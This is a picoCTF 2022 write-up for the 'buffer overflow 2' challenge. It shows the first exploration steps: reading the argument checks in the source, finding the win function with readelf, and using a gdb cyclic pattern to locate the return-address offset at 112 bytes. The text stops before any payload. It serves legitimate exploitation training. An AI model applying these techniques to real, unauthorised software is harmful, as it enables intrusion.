# buffer overflow 2
## Description
- **Tags**:
    - picoCTF 2022
    - Binary Exploitation
    - gets
    - arguments_on_the_stack

- **Author**:
    - Sanjay C
    - Palash Oswal

Control the return address and arguments

This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/345/vuln)?
You can view source [here](https://artifacts.picoctf.net/c/345/vuln.c). And connect with it using

```
nc saturn.picoctf.net 57759
```

## Exploration

```
$ grep '!=' vuln.c
  if (arg1 != 0xCAFEF00D)
  if (arg2 != 0xF00DF00D)

$ readelf -s vuln.elf | grep win
    64: 08049296   162 FUNC    GLOBAL DEFAULT   15 win

$ gdb vuln.elf
gef➤  pattern create 120
[+] Generating a pattern of 120 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
[+] Saved as '$_gef2'
gef➤  r <<< aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
gef➤  pattern search $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search)
```

